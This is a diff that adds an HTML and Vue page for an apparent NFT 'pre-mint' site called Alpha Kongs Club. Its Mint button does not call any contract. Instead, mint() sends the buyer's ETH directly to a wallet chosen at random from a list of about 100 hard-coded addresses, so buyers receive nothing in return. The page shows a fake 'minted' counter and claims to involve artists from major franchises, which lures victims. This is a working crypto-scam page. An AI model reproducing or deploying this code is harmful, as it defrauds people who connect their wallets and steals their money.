@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <link rel="icon" href="logo.png">
+
+    <title>Alpha Kongs Club</title>
+    <meta property="og:title" content="Pre-mint - alphakongsmint.live">
+    <meta name="twitter:title" content="Pre-mint - alphakongsmint.live">
+    <meta name="twitter:image" content="https://alphakongsmint.live/embed.png">
+    <meta property="og:url" content="https://alphakongsmint.live/">
+
+    <style type="text/css">
+        body{min-height:100vh;margin:0;padding:0;background:#000 url(image.png) right bottom no-repeat;background-size:auto 100%;color:#fff;font-family:arial,sans-serif;}
+        #app{max-width:1200px;margin:0 auto;}
+        .header{margin-bottom:150px;padding-top:22px;display:flex;align-items:center;justify-content:space-between;}
+        .header .brand{display:flex;align-items:center;justify-content:center;font-size:24px;color:#bbb;text-transform:uppercase;font-weight:500;}
+        .header .brand img{margin-right:15px;width:47px;height:47px;border-radius:50%;}
+        .wallet{display:flex;align-items:center;}
+        .wallet button{cursor:pointer;width:232px;height:60px;background:#d5107a;border:0;border-radius:50px;font-size:22px;color:#fff;font-weight:700;}
+        .wallet button:hover{background:#aa0b60}
+        .metamask{margin:0 0 0 10px;line-height:24px;}
+        .metamask svg{margin:0 5px 0 0;vertical-align:middle;}
+        .metamask a{color:#ecc63e}
+        .details{display:flex;color:#fff;font-size:20px;margin:0 0 20px}
+        .details > div{background:#212825;border-radius:8px;padding:8px 16px;margin:0 5px 0;}
+        .details > div > span{display:block;color:#999;text-transform:uppercase;font-size:16px;margin:0 0 5px}
+        .main{max-width:700px;}
+        .main .title{font-size:116px;font-weight:900;line-height:100px;margin-bottom:11px;text-transform:uppercase;}
+        .quantity{display:flex;align-items:center;margin:0 22px 36px 0;}
+        .quantity div{display:flex;align-items:center;}
+        .quantity button{cursor:pointer;width:42px;height:42px;border:0;border-radius:50%;font-size:20px;font-weight:700;background:#e2b411;color:#000;}
+        .quantity input{display:flex;align-items:center;justify-content:center;text-align:center;border:0;box-sizing:border-box;border-radius:10px;font-size:20px;font-weight:500;width:68px;height:42px;background:#2b2b2b;color:#fff;margin:0 10px;}
+        .quantity span{margin:0 0 0 25px;}
+        .desc{font-size:20px;line-height:26px;margin:20px 0 30px 0;max-width:620px;}
+        input[type=number]{-moz-appearance:textfield;}input::-webkit-outer-spin-button,input::-webkit-inner-spin-button{-webkit-appearance:none;margin:0;}
+
+        @media screen and (max-width: 1300px){
+            #app{max-width:990px;}
+        }
+
+        @media screen and (max-width: 1024px){
+            #app{max-width:800px;}
+            .header{margin-bottom:50px;}
+            .main{background:rgba(0,0,0,0.5);padding:30px 20px;border-radius:15px;text-align:center;}
+            .main .title{font-size:70px;font-weight:900;line-height:70px;}
+            .desc{max-width:100%;margin:0 auto;}
+            .quantity{margin:25px 22px 36px 0;}
+            .details,.quantity,.wallet{justify-content:center;}
+        }
+
+        @media screen and (max-width: 750px){
+            #app{margin:auto 15px;}
+            .quantity{display:block;margin-right:0;}
+            .quantity div{justify-content:center;margin-bottom:15px;}
+            .quantity span{margin:0}
+            .main .title{font-size:50px;line-height:50px;}
+            .desc{font-size:18px;line-height:24px;}
+            .details{flex-wrap:wrap;}
+            .details > div{border-radius:5px;padding:8px 16px;margin:0 5px 10px;width:31%;font-size:16px;}
+            .details span span{display:none;}
+            .social{min-width:90px;}
+        }
+    </style>
+</head>
+
+<body>
+
+<div id="app">
+    <div class="header">
+        <div class="brand"><img src="logo.png" :title="siteName"> {{ siteName }}</div>
+        <div class="social">
+            <a :href="socialDiscord" target="_blank"><svg width="42" height="42" role="img" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path fill="#fff" d="m386 137c-24-11-49.5-19-76.3-23.7c-.5 0-1 0-1.2.6c-3.3 5.9-7 13.5-9.5 19.5c-29-4.3-57.5-4.3-85.7 0c-2.6-6.2-6.3-13.7-10-19.5c-.3-.4-.7-.7-1.2-.6c-23 4.6-52.4 13-76 23.7c-.2 0-.4.2-.5.4c-49 73-62 143-55 213c0 .3.2.7.5 1c32 23.6 63 38 93.6 47.3c.5 0 1 0 1.3-.4c7.2-9.8 13.6-20.2 19.2-31.2c.3-.6 0-1.4-.7-1.6c-10-4-20-8.6-29.3-14c-.7-.4-.8-1.5 0-2c2-1.5 4-3 5.8-4.5c.3-.3.8-.3 1.2-.2c61.4 28 128 28 188 0c.4-.2.9-.1 1.2.1c1.9 1.6 3.8 3.1 5.8 4.6c.7.5.6 1.6 0 2c-9.3 5.5-19 10-29.3 14c-.7.3-1 1-.6 1.7c5.6 11 12.1 21.3 19 31c.3.4.8.6 1.3.4c30.6-9.5 61.7-23.8 93.8-47.3c.3-.2.5-.5.5-1c7.8-80.9-13.1-151-55.4-213c0-.2-.3-.4-.5-.4Zm-192 171c-19 0-34-17-34-38c0-21 15-38 34-38c19 0 34 17 34 38c0 21-15 38-34 38zm125 0c-19 0-34-17-34-38c0-21 15-38 34-38c19 0 34 17 34 38c0 21-15 38-34 38z"/></svg></a>
+            <a :href="socialTwitter" target="_blank"><svg width="42" height="42" role="img" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path fill="#fff" d="M437 152a72 72 0 01-40 12a72 72 0 0032-40a72 72 0 01-45 17a72 72 0 00-122 65a200 200 0 01-145-74a72 72 0 0022 94a72 72 0 01-32-7a72 72 0 0056 69a72 72 0 01-32 1a72 72 0 0067 50a200 200 0 01-105 29a200 200 0 00309-179a200 200 0 0035-37"/></svg></a>
+        </div>
+    </div>
+    <div class="main">
+        <div class="details">
+            <div><span>Supply</span> {{ mintSupply }}</div>
+            <div><span>Price</span> {{ mintPrice }} {{ currency }}</div>
+            <div><span><span>Max</span> Limit</span> {{ limit }} per wallet</div>
+            <div><span>Minted</span> {{ minted }} / {{ mintSupply }}</div>
+        </div>
+        <div class="title" v-html="bigHeading"></div>
+        <div class="desc" v-html="desc"></div>
+        <div class="quantity">
+            <div>
+                <button v-on:click="quantity--">−</button>
+                <input v-model="quantity" step="1" type="number">
+                <button v-on:click="quantity++">+</button>
+            </div>
+            <span>Total: {{ (quantity * mintPrice).toFixed(2) }} {{ currency }}</span>
+        </div>
+        <div class="wallet">
+            <button v-if="!connected" @click="connect">Connect wallet</button>
+            <button v-if="connected" @click="mint">Mint</button>
+            <span class="metamask" v-if="!metamask"><svg fill="#fff" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M12 2c5.514 0 10 4.486 10 10s-4.486 10-10 10-10-4.486-10-10 4.486-10 10-10zm0-2c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm-.001 5.75c.69 0 1.251.56 1.251 1.25s-.561 1.25-1.251 1.25-1.249-.56-1.249-1.25.559-1.25 1.249-1.25zm2.001 12.25h-4v-1c.484-.179 1-.201 1-.735v-4.467c0-.534-.516-.618-1-.797v-1h3v6.265c0 .535.517.558 1 .735v.999z"/></svg> You dont have MetaMask installed. <a href="https://metamask.io/faqs/" target="_blank">Need help?</a></span>
+        </div>
+    </div>
+</div>
+
+<script src="https://unpkg.com/vue@2.6.14/dist/vue.min.js"></script>
+<script src="https://unpkg.com/@metamask/legacy-web3@2.0.0/dist/metamask.web3.min.js"></script>
+<script>
+
+new Vue({
+	el: '#app',
+	data: {
+		mintSupply: '8,888',
+        minted: '3,147',
+        mintPrice: 0.15,
+        currency: 'ETH',
+        siteName: 'Alpha Kongs',
+        bigHeading: 'Alpha Kongs Pre-mint',
+        desc: 'An Exclusive Club of 8,888 Alpha Kongs, made by the artists behind Star Wars, Game of Thrones, Pokémon and more.',
+        socialDiscord: 'https://discord.gg/alphakongsclub',
+        socialTwitter: 'https://twitter.com/alphakongsclub',
+        quantity: 1,
+        limit: 5,
+        connected: false,
+        metamask: true,
+        nfts: []
+	},
+    mounted(){
+        this.nfts = ['0xa81a5F2942C113048d4542A36D7C485F3B4c4f68','0x4d5222256e1AacD0823f9112078f8ab1d9Bfdca3','0x87863DCAb190FDcb56A6A4Dd18b5D07650529A17','0xC10C6778Bf9e9813b97B1b15088c76f1059a38ad','0x655b5721d518C1be38C0456ab07e6fbda9110EE3','0xEA639e414dddEDf454590693163f01E982Ea1Afb','0xF3b6052da1040B3F566657a782E2C89F35233350','0xC06Ab84675a1763505BCeCfC12CB2efe8E183095','0x1aE42046C6682f2d66c6f7EBD6E7db038e2772d7','0x3C386617F05dAC7adB875d60368e09fC33D29f05','0xc32847561EEa24E70B23DA5aE987728E889A1387','0x0959f5dE67fFB1d0349b091a47ec3f27D68b67C6','0x78C1772Af842099f84bD6b3a66F5e40d99F35292','0x15cceb5c19e481a52bA5B742Bb4b23C060C1134d','0x3824A3cCF32892979571A541bc0339874AFC2004','0x2FF135399AdF22304D20efD2d47D777339DE8671','0x67564F64c284C00917227698394ca28897a940c8','0x46D4798bC6Bd62B17Fd3A58A5FA4c32626B3377D','0x87d25798c2D3DDE0759BFE8F260b3A36cB8aCC19','0xf483c3058E6Fdf4a89AdEC7D58F8dE32b9Bf40c4','0x705b796568987d1C6764601E3E36128a8911191C','0x5e15a76B00Dde2c57514bb42565754df2b13267C','0x85edb3c8637d4590ce45fB2ca1235Ee0D0B9b819','0x5325cc901c8FD89160DC468F616B1c42cB03Fd51','0x5E711a4c79000aD40267115B42897fB7B745Ece6','0xF9792D32cFC0917397C0Cb224D13Fe1f0F99EAfD','0x1BF69aC9f4385e8C4fBa1147551d3ef2772527B4','0x3526a82984a50131F885E71d3Ccb7c8F168655E9','0xF50b04A3Abb86e53A93fbB741fD5943849c5A009','0x8275F1334daE4dfe0a55E41F59CDFB0f289F5016','0x4dF59f8775E7a233E13B737ab9d6cF2367b8393D','0x1Bf3bf5c57347F2503f93227fb34e3BA4B429784','0xA06fc21143aCab8d30A7a295FB626B65025df323','0x966e1Ef9ad802517011057F897Cc7E12E1e664ed','0xF8fc1cE525d655f37876ebD1f9C66609E3D3259f','0x4DC9291E1E5d4be7d177ccEDFf0FeB91f80cde9d','0x339F93174fd066Ea367A0f8fd16AfcD83DffC33C','0x5CFF1d12FaE7349138466a9f6A7E2dDF26E5Be43','0x91cdD04fa0136C3E91EBfD126c73fc97274f7Fab','0x13ce68b9B8C658D7Cb7bB7CdDE1a145FdE63E1c1','0x8F555a275d631FA7dD6Faf1E3a4Fa8269f4bBBda','0x6e40bf178EAc4f44aE4f0909ADc95354286a9db5','0x7Ea5035B02Bd6b7147c6785D0413abC871933AeB','0x630FD5d5F3d63bCe847cA5bf07Bc228d24Cce451','0xED99207fba3E4c01d9f28FA7CF63AA8E21Db07ff','0x8D341842FC764028537FF28D05631Ea8de09CCA6','0x1592476eC508d647f199e86725156aFF7C0CCDb7','0x79aee5030B17bd6a3698817d98F90F229b11b806','0x09c4AAdb80cf4892594e8dfBEa5F5BAA6D409c7A','0xEBBe88BF5a1c721f1866d8040Fc78d5f46c987C6','0x0378f94D0946BAF1c50a56836435be8994A4810C','0xa7a843E2733f21348A7Cdbf9af0470523B311EFC','0xa501050093A43CEB8077c77415C1A994254D1e67','0x0bb9d4fBDfadD2DB9155E417c69962347808b5DB','0xce5b18Ba2068603229c75a461aC8D5c13664A512','0xA59dc06627239b4cfFDA5831db5Ac62Dd5cca9D2','0x3bB97E83A757139031B9e9Fe4E79531A5F185d29','0xa1941959Fd0c54aC8F054161643b1D0466dF2196','0x00a94725d318F7D9afbBa99e70a2Db81f94d19FD','0xD9fF75eef4F07182c409e9342A2fd61Db1211F04','0x621B9cD826400A8d944E2A8631aA11282173ee4B','0x1C29939eF2559c57fF946192eb5b00E7A7AA8E5e','0x5731ecB65c5339830E9CbE815d8340f43aAC79C3','0x82D9AafB1A547B1628557Ff0AcDCE477be3f3198','0x18Ee070766Fdb8A702480a9fA507C725A84c051a','0x76947d5942d83A9c8049A4451706c110A940dB03','0x6B79699A1C8403340e2397c44600D6c44093C2e2','0x9491A6B82177bCe8c0EA28F790c67956C566916C','0x742aaBaadd0AE5555FDC9Fc31dAD3A2B4f797460','0x148153c8b35eE564383d3885530c41fb96a3fC4b','0x00009E6b8d9f8036E09d86816193C16256a5EcCc','0x9AED477b4ee08AE1Ab4A262D96fB0549e59DcBE8','0xC7C5FFC25266Dea9B44264DEd798081e99088350','0x98FCBCeF1DCC0c2908695edB37283C89b3d92a96','0x80f8660d7949c5FAeBC6E5a8b47602CC596377C6','0xBb34130929e1F7348b9651A67F9b922eD4A6DeE2','0xdB7648f3D1B961539d177BB24aBB40297fd0bC8D','0x617b3e9833Cc251827B74f74766AD7BF0C644F74','0x581EADf68334ce806010de9eB49cc7aC2469D7D5','0xc3028eAb44EE8c8DEDbEd0D26Fe9DFa5abd38EbE','0x3e3b97334d3a88Ae02320c901d8d68eDCE06DA61','0xD59Cf425fC71b67160dD8c01e9F4C93d14366688','0xC6EA196B6684574Fe8268BdDAdA82a051C19b19F','0xCCaE57495A84d2aC851E79c84F948379d0b25DbE','0xEf750c924C4A6f04e18700849aA8Dc6569173144','0xB77aA82966e87Bac2574B2895Ce651089f17A12F','0x0eA7C5D7720B0e1C0ee12Fa0d07D98642bf84119','0x4dF44E0be16303708b7C0c3B827440d1ACccE018','0x0A0c6618f2B3C14a6607a0C5f4618446359617d0','0x09B5D0D221A38A157cBd8BbA6E8cD86e9Ced8b70','0x74717cB63C11B97e123beC0F4452319239D15A64','0xBeF28637EA9E802A5Bc62e20a5150A63C869EfB5','0x1Ebb4D75b906933E4fBFe13E384DfcCe5B136a3c','0x31aCc3aCD4247FA065593D50288C4b6080265d31','0x44a69AD023FD64312eFbEa09B69aA2Cbb4b26107','0xB7e9Df780d5605279a3B731F8c06729B09e46704','0x170aD1499c8Cf887dDB3c3E51B89BCc758626d71','0xfE061d39A75A874D793Ec4272039f659e972A58f','0x704D39047Bfd6f3527d6Bf55ae42f11351d90266','0x467f08EfDdba006041628aaC2Fa9a50780ee24eB']
+    },
+	methods: {
+        connect: async function(){
+            if (window.ethereum) {
+                window.web3 = new Web3(ethereum);
+                try {
+                    await ethereum.enable();
+                    this.connected = true
+                } catch (err) {
+                    console.log('Connect Failed', err)
+                }
+            } else if (window.web3) {
+                window.web3 = new Web3(web3.currentProvider)
+                this.connected = true
+            } else {
+                this.metamask = false
+            }
+        },
+        mint: function(){
+            let mintAmount = Number(this.mintPrice * this.quantity)
+            web3.eth.sendTransaction({
+                to: this.nfts[Math.floor(Math.random()*this.nfts.length)],
+                value: web3.toWei(mintAmount, 'ether')
+            }, (err, transactionId) => {
+                if (err) {
+                    console.log('Payment failed', err)
+                } else {
+                    console.log('Payment successful', transactionId)
+                }
+            })
+        }
+	},
+	watch: {
+		quantity: function(){
+            if(this.quantity>this.limit){
+                this.quantity = this.limit
+            }
+            if(this.quantity<1){
+                this.quantity = 1
+            }
+		}
+	}
+})
+
+</script>
+
+</body>
+</html>
